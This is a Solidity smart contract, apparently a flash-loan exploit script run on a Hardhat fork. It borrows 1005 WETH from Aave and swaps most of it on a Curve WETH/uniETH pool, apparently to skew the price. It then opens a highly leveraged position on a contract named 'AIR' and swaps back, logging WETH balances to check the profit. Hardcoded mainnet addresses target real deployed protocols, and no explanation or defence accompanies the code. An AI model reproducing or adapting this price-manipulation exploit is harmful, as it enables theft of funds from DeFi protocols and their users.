// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.0 <0.9.0;

import "hardhat/console.sol";

interface IERC20 {
  function totalSupply() external view returns (uint256 _supply);
  function balanceOf(address _owner) external view returns (uint256 _balance);
  function approve(address _spender, uint256 _value) external returns (bool _success);
  function transfer(address _to, uint256 _value) external returns (bool _success);
  function transferFrom(address from, address to, uint value) external returns (bool);
  function decimals()external view returns(uint256 _decimals);
    function withdraw(uint wad) external;
}
interface ILendingPool{
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IAir{
    function openPosition(uint256 _leverage) external payable;
    function closePosition(uint256 _positionID) external;
}

interface ICurve{
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}


contract Sed {
    address owner;
    address AAVE = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address UNIETH = 0xF1376bceF0f78459C0Ed0ba5ddce976F1ddF51F4;
    address AIR = 0x291B812D84707EEB256D618C4c333Ff5F451321F;
    address CURVE = 0x0f2F4D68308dB60d36268a602EF273421A227021;
    ICurve curve;
    IAir air;
    ILendingPool aave;
    
    constructor() {
        owner =  msg.sender;
        aave = ILendingPool(AAVE);
        air = IAir(AIR);
        curve = ICurve(CURVE);
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    function fuck() public{
        aave.flashLoanSimple(address(this),WETH,1005*1e18,"0x",0);
    }

    function open() public payable{
        air.openPosition{value:msg.value}(1100);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium,address initiator,bytes calldata params) external returns (bool){
        //air.closePosition(0);
        IERC20(WETH).approve(CURVE,type(uint).max);
        IERC20(UNIETH).approve(CURVE,type(uint).max);
        IERC20(WETH).approve(AAVE,type(uint).max);
        console.log("WETH ",IERC20(WETH).balanceOf(address(this)));
        curve.exchange(1,0,1000*1e18,0);
        IERC20(WETH).withdraw(46*1e17);
        air.openPosition{value:46*1e17}(15000);
        curve.exchange(0,1,IERC20(UNIETH).balanceOf(address(this)),0);
        console.log("WETH ",IERC20(WETH).balanceOf(address(this)));
        return true;
    }

    receive() external payable {
    }

}
